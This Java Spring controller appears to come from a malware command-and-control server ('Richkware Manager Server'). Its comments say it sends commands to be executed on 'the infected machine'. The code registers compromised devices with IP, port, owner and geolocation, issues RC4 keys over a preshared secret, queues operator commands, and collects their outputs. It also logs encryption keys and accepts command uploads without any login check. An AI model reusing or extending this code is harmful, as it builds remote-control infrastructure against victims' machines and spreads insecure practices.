package it.richkmeli.rms.web.v2.entity;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import it.richkmeli.jframework.auth.data.exception.AuthDatabaseException;
import it.richkmeli.jframework.auth.web.util.AuthServletManager;
import it.richkmeli.jframework.crypto.Crypto;
import it.richkmeli.jframework.network.tcp.server.http.payload.response.KoResponse;
import it.richkmeli.jframework.network.tcp.server.http.payload.response.OkResponse;
import it.richkmeli.jframework.network.tcp.server.http.util.JServletException;
import it.richkmeli.jframework.util.RandomStringGenerator;
import it.richkmeli.jframework.util.log.Logger;
import it.richkmeli.rms.data.entity.device.DeviceDatabaseModel;
import it.richkmeli.rms.data.entity.device.model.Device;
import it.richkmeli.rms.util.GeoLocation;
import it.richkmeli.rms.web.util.RMSServletManager;
import it.richkmeli.rms.web.util.RMSSession;
import it.richkmeli.rms.web.util.RMSStatusCode;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.IOException;
import java.util.*;

@RestController
public class DeviceController {
    private static final long serialVersionUID = 1L;
    private static final int keyLength = 32;
    //private final UserRepository userRepository;
    private final String password;

    DeviceController(/*UserRepository userRepository*/) {
        //this.userRepository = userRepository;
        password = ResourceBundle.getBundle("configuration").getString("encryptionkey");
    }

    /**
     * PUT
     * put device to RMS, if for the device is te first call, all the payload is encrypted
     * with the preshared key, otherwise the first key (data0) is encrypted with preshared
     * and others with server-side generated key for specific device (returned at the first
     * call)
     */
    @PutMapping(name = "device", path = {"/device", "/Richkware-Manager-Server/device"})
    public void putDevice() {
        ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
        HttpServletRequest request = servletRequestAttributes.getRequest();
        HttpServletResponse response = servletRequestAttributes.getResponse();

        try {
            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);

            // server session
            RMSSession rmsSession = rmsServletManager.getRMSServerSession();
            if (attribMap.containsKey(RMSServletManager.PAYLOAD_KEY.NAME) &&
                    attribMap.containsKey(RMSServletManager.PAYLOAD_KEY.SERVER_PORT) &&
                    attribMap.containsKey(RMSServletManager.PAYLOAD_KEY.ASSOCIATED_USER)) {

                // common fields
                String name = attribMap.get(RMSServletManager.PAYLOAD_KEY.NAME);
                String serverPort = attribMap.get(RMSServletManager.PAYLOAD_KEY.SERVER_PORT);
                String associatedUser = attribMap.get(RMSServletManager.PAYLOAD_KEY.ASSOCIATED_USER);
                String encryptionKey = RandomStringGenerator.generateAlphanumericString(keyLength);
                String timeStamp = String.valueOf(new Date().getTime()); //new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new Date());

                // mobile fields
                String installationId = attribMap.getOrDefault(RMSServletManager.PAYLOAD_KEY.INSTALLATION_ID, "");
                String location = attribMap.getOrDefault(RMSServletManager.PAYLOAD_KEY.LOCATION, "");
                String extractedLocation = GeoLocation.extractLocation(location);

                Device newDevice = new Device(
                        name,
                        request.getRemoteAddr(),
                        serverPort,
                        timeStamp,
                        encryptionKey,
                        associatedUser,
                        "",
                        "",
                        installationId,
                        extractedLocation);

                Logger.info("SERVLET device, doPut: Device: " + name + " " + request.getRemoteAddr() + " " + serverPort + " " + timeStamp + " " + encryptionKey + " " + associatedUser + " ");

                // check in the DB if there is an entry with that name
                DeviceDatabaseModel deviceDatabaseSpringManager = rmsSession.getDeviceDatabaseManager();
                Device oldDevice = deviceDatabaseSpringManager.getDevice(name);

                String message = "";
                if (oldDevice == null) {
                    deviceDatabaseSpringManager.addDevice(newDevice);
                    message = "Device " + newDevice.getName() + " added.";
                } else {
                    // do not change Encryption Key
                    newDevice.setEncryptionKey(oldDevice.getEncryptionKey());
                    deviceDatabaseSpringManager.editDevice(newDevice);
                    message = "Device " + newDevice.getName() + " updated.";
                }

                message = rmsServletManager.doDefaultProcessResponse(message);
                AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, message));
            } else {
                // arguments not present
                AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, "Parameters missing"));
            }
        } catch (JServletException e) {
            AuthServletManager.print(response, e.getResponse());
        } catch (Exception e) {
            e.printStackTrace();
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
        }
    }

    /**
     * DELETE
     * delete device from device list. Every user can delete only its own device, admin user
     * can delete all devices
     */
    @DeleteMapping(name = "device", path = "/device")
    public void deleteDevice() {
        ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
        HttpServletRequest request = servletRequestAttributes.getRequest();
        HttpServletResponse response = servletRequestAttributes.getResponse();

        // TODO fix output with standard payload
        try {
            HttpSession httpSession = request.getSession();
            RMSSession rmsSession = null;
            try {
                RMSServletManager rmsServletManager = new RMSServletManager(request, response);
                rmsSession = rmsServletManager.getRMSServerSession();
            } catch (JServletException e) {
                httpSession.setAttribute("error", e);
                request.getRequestDispatcher(RMSServletManager.ERROR_JSP).forward(request, response);

            }

            try {
                String user = rmsSession.getUserID();
                // Authentication
                if (user != null) {
                    if (request.getParameterMap().containsKey("name")) {
                        String name = request.getParameter("name");

                        Device device = rmsSession.getDeviceDatabaseManager().getDevice(name);

                        if (device.getAssociatedUser().compareTo(rmsSession.getUserID()) == 0 ||
                                rmsSession.isAdmin()) {
                            rmsSession.getDeviceDatabaseManager().removeDevice(name);
                            AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, "Device " + name + " deleted."));
                        } else {
                            // TODO rimanda da qualche parte perche c'è errore
                            httpSession.setAttribute("error", "non hai i privilegi");
                            request.getRequestDispatcher(RMSServletManager.LOGIN_HTML).forward(request, response);
                        }

                    } else {
                        // TODO rimanda da qualche parte perche c'è errore
                        httpSession.setAttribute("error", "dispositivo non specificato");
                        request.getRequestDispatcher(RMSServletManager.LOGIN_HTML).forward(request, response);
                    }
                } else {
                    // non loggato
                    // TODO rimanda da qualche parte perche c'è errore
                    httpSession.setAttribute("error", "non loggato");
                    request.getRequestDispatcher(RMSServletManager.LOGIN_HTML).forward(request, response);
                }
            } catch (Exception e) {
                // redirect to the JSP that handles errors
                httpSession.setAttribute("error", e);
                request.getRequestDispatcher(RMSServletManager.ERROR_JSP).forward(request, response);
            }
        } catch (Exception e) {
            e.printStackTrace();
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
        }
    }

    /**
     * GET
     * get the device list. Every user can view only its own devices, admin users have
     * visibility to view all devices.
     */
    @GetMapping(name = "devices", path = "/devices")
    public void getDevices() {
        ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
        HttpServletRequest request = servletRequestAttributes.getRequest();
        HttpServletResponse response = servletRequestAttributes.getResponse();

        try {
            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
            rmsServletManager.doDefaultProcessRequest();
            rmsServletManager.checkLogin();

            // server session
            RMSSession rmsSession = rmsServletManager.getRMSServerSession();
            DeviceDatabaseModel databaseManager = rmsSession.getDeviceDatabaseManager();
            List<Device> devices = null;
            if (rmsSession.isAdmin()) {
                // if the user is an Admin, it gets the list of all devices
                devices = databaseManager.getAllDevices();
            } else {
                devices = databaseManager.getUserDevices(rmsSession.getUserID());
            }

            String deviceListJSON = generateDevicesListJSON(devices);

            String message = rmsServletManager.doDefaultProcessResponse(deviceListJSON);
            AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, message));

        } catch (JServletException e) {
            AuthServletManager.print(response, e.getResponse());
        } catch (AuthDatabaseException e) {
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_ERROR, e.getMessage()));
        } catch (Exception e) {
            //e.printStackTrace();
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
        }
    }

    private String generateDevicesListJSON(List<Device> devices) throws JsonProcessingException {
//        Type type = new TypeToken<List<Device>>() {
//        }.getType();
//        Gson gson = new Gson();
//
//        // oggetto -> gson
//        String devicesJSON = gson.toJson(devices, type);

        ObjectMapper objectMapper = new ObjectMapper();
        String devicesJSON = objectMapper.writeValueAsString(devices);
        return devicesJSON;
    }

    /**
     * GET
     * Richkware Agent use this verb to get commands that have to be executed on the
     * infected machine.
     * Webapp and RMC use this verb to get command outputs
     */
    @GetMapping(name = "command", path = "/command")
    public void getCommand() {
        ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
        HttpServletRequest request = servletRequestAttributes.getRequest();
        HttpServletResponse response = servletRequestAttributes.getResponse();

        try {
            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
            // TODO il cookie non deve essere controllato se è un richkware agent, negli altri casi si
            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);

            // server session
            RMSSession rmsSession = rmsServletManager.getRMSServerSession();

            String deviceName = attribMap.get("data0");

            String output = null;

            if (RMSServletManager.Channel.RICHKWARE.equalsIgnoreCase(rmsSession.getChannel())) {
                // get the deviceName decrypting with the default key
                deviceName = Crypto.decryptRC4(deviceName, password);
                output = rmsSession.getDeviceDatabaseManager().getCommands(deviceName);
                rmsSession.getDeviceDatabaseManager().editCommands(deviceName, "");
                // TODO return the commands to be executed encrypted with the specific key of that device
                //output = Crypto.encryptRC4(output,rmsSession.getDeviceDatabaseManager().getEncryptionKey(deviceName));
            } else {
                output = rmsSession.getDeviceDatabaseManager().getCommandsOutput(deviceName);
                output = rmsServletManager.doDefaultProcessResponse(output);
            }
            if (!output.isEmpty()) {
                AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, output));
            } else {
                AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_FIELD_EMPTY));
            }
        } catch (AuthDatabaseException e) {
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_ERROR, e.getMessage()));
        } catch (Exception e) {
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
        }
    }

    /**
     * PUT
     * Webapp and RMC upload commands that have to be executed on a specific device
     */
    @PutMapping(name = "command", path = "/command")
    public void putCommand() {
        ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
        HttpServletRequest request = servletRequestAttributes.getRequest();
        HttpServletResponse response = servletRequestAttributes.getResponse();

        //TODO: gestire richieste per multipli device

        try {
            BufferedReader br = request.getReader();
            String data = br.readLine();
            JSONObject JSONData = new JSONObject(data);
            JSONArray devicesName = JSONData.getJSONArray("devices");
            String commands = JSONData.getString("commands");

            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
            RMSSession rmsSession = rmsServletManager.getRMSServerSession();

            List<String> failedResponse = new ArrayList<>();
            for (Object device : devicesName) {
                if (!rmsSession.getDeviceDatabaseManager().editCommands((String) device, commands)) {
                    failedResponse.add((String) device);
                }
            }

            if (failedResponse.isEmpty())
                AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, "commands added."));
            else {
                AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, Arrays.toString(failedResponse.toArray())));
            }

            br.close();
        } catch (JServletException | JSONException | AuthDatabaseException | IOException e) {
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
        }
    }

    /**
     * POST
     * Richkware Agent use this verb to upload the command outputs of the command sent before by
     * webapp or RMC with verb PUT
     */
    @PostMapping(name = "command", path = "/command")
    public void postCommand() {
        ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
        HttpServletRequest request = servletRequestAttributes.getRequest();
        HttpServletResponse response = servletRequestAttributes.getResponse();

        try {
            RMSServletManager rmsServletManager = new RMSServletManager(request, response);
            Map<String, String> attribMap = rmsServletManager.doDefaultProcessRequest(false);

            // server session
            RMSSession rmsSession = rmsServletManager.getRMSServerSession();

            // device: deviceID
            // data: command outputs
            if (attribMap.containsKey("device") &&
                    attribMap.containsKey("data")) {

                String deviceName = attribMap.get("device");
                String commandsOutput = attribMap.get("data");

                //commandsOutput = Crypto.decryptRC4(commandsOutput, password);
                //commandsOutput= new String(Base64.getUrlDecoder().decode(commandsOutput));
                // Reverse command output has to be sent to the front end in base64 format

                boolean result = rmsSession.getDeviceDatabaseManager().setCommandsOutput(deviceName, commandsOutput);
                if (result) {
                    rmsSession.getDeviceDatabaseManager().editCommands(deviceName, "");
                    AuthServletManager.print(response, new OkResponse(RMSStatusCode.SUCCESS, "editCommands succeeded"));
                } else {
                    AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_FIELD_EMPTY, "Field not found in DB"));
                }
            } else {
                // argomenti non presenti
                AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, "Parameters missing"));
            }
        } catch (JServletException e) {
            AuthServletManager.print(response, e.getResponse());
        } catch (AuthDatabaseException e) {
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.DB_ERROR, e.getMessage()));
        } catch (Exception e) {
            //e.printStackTrace();
            AuthServletManager.print(response, new KoResponse(RMSStatusCode.GENERIC_ERROR, e.getMessage()));
        }
    }
}
